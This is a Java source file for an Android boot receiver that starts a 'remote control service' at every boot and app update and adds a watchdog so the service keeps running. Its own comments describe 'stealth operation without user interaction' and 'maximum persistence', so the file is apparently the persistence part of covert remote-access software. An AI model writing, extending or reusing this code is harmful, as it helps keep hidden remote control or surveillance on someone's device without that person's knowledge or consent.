package com.example.myapplication555.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.example.myapplication555.service.RemoteControlService;
import com.example.myapplication555.managers.WatchdogManager;

/**
 * Boot Receiver - Automatically starts remote control service on device boot
 * Enables stealth operation without user interaction
 * Handles multiple boot scenarios for maximum reliability
 */
public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.i(TAG, "📡 Received broadcast: " + action);
        
        if (isBootAction(action)) {
            Log.i(TAG, "🚀 Device boot detected - starting remote control service");
            startRemoteControlService(context, true);
        } else if (isPackageAction(action)) {
            Log.i(TAG, "📦 App update detected - restarting remote control service");
            startRemoteControlService(context, false);
        }
    }

    /**
     * Check if the action is a boot-related action
     */
    private boolean isBootAction(String action) {
        return Intent.ACTION_BOOT_COMPLETED.equals(action) ||
               "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
               Intent.ACTION_REBOOT.equals(action);
    }

    /**
     * Check if the action is a package replacement action
     */
    private boolean isPackageAction(String action) {
        return Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
               Intent.ACTION_PACKAGE_REPLACED.equals(action);
    }

    /**
     * Start the remote control service with proper error handling
     */
    private void startRemoteControlService(Context context, boolean isBootStart) {
        try {
            // Create service intent
            Intent serviceIntent = new Intent(context, RemoteControlService.class);
            serviceIntent.putExtra("auto_start", true);
            serviceIntent.putExtra("boot_start", isBootStart);
            
            // Start service based on Android version
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Log.d(TAG, "🎯 Starting foreground service (Android 8.0+)");
                context.startForegroundService(serviceIntent);
            } else {
                Log.d(TAG, "🎯 Starting regular service (Android 7.x)");
                context.startService(serviceIntent);
            }
            
            Log.i(TAG, "✅ Remote control service started successfully");
            
            // Start watchdog monitoring for maximum persistence
            try {
                WatchdogManager watchdogManager = new WatchdogManager(context);
                watchdogManager.startWatchdog();
                Log.i(TAG, "🛡️ Watchdog monitoring started - service will be bulletproof");
            } catch (Exception e) {
                Log.e(TAG, "⚠️ Failed to start watchdog (service will still work)", e);
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Security exception starting service - check permissions", e);
        } catch (IllegalStateException e) {
            Log.e(TAG, "❌ Illegal state starting service - Android restrictions", e);
            
            // Try alternative approach for restricted scenarios
            Log.i(TAG, "🔄 Attempting alternative startup method...");
            startWithDelay(context);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Unexpected error starting service", e);
        }
    }

    /**
     * Alternative startup method with delay for restricted scenarios
     */
    private void startWithDelay(Context context) {
        try {
            // Use WorkManager as fallback for immediate restart
            WatchdogManager watchdogManager = new WatchdogManager(context);
            watchdogManager.forceWatchdogCheck();
            Log.i(TAG, "🔄 Fallback: Using watchdog for immediate service start");
        } catch (Exception e) {
            Log.e(TAG, "❌ Fallback method also failed", e);
        }
    }
} 